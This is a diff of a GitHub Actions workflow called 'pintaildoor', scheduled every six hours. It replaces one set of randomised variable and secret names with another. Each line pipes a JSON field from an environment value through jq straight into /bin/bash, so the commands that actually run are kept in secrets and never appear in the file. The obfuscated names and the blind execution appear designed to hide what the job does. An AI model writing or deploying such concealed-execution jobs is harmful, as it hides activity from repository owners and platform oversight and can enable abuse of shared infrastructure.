@@ -2,28 +2,23 @@ name: pintaildoor
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
+    - cron: '6 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pintaildoor
         env:
-          ldhpl9577: ${{ secrets.ldhpl9577 }}
+          miqk2682: ${{ secrets.miqk2682 }}
         run: |
-          echo $ldhpl9577 | jq -r .t64 | /bin/bash
-          echo $lj104 | jq -r .tm5 | /bin/bash
-          echo $dj9 | jq -r .vxamy27390 | /bin/bash
-          echo $j085 | jq -r .kd1 | /bin/bash
-          echo $ekg990 | jq -r .d4124 | /bin/bash
-          echo $m3 | jq -r .wsui20 | /bin/bash
-          echo $bxlb46 | jq -r .x025 | /bin/bash
-          echo $dc596 | jq -r .vdd3 | /bin/bash
-          echo $cgqs0255 | jq -r .kdi2107 | /bin/bash
-          echo $j280 | jq -r .aycvj4552 | /bin/bash
-          echo $w28 | jq -r .he477 | /bin/bash
-          echo $yonkc453 | jq -r .nhma2 | /bin/bash
-          echo $w708 | jq -r .ybfdb53 | /bin/bash
-          echo $igzq85166 | jq -r .bdky6844 | /bin/bash
+          echo $miqk2682 | jq -r .vq711 | /bin/bash
+          echo $vd22601 | jq -r .ih1 | /bin/bash
+          echo $mdugw76 | jq -r .ahwrp97448 | /bin/bash
+          echo $mqj132 | jq -r .gmn4 | /bin/bash
+          echo $hdtzo90 | jq -r .ogt459 | /bin/bash
+          echo $xvu66138 | jq -r .pb4160 | /bin/bash
+          echo $rzp05328 | jq -r .mlr0 | /bin/bash
 
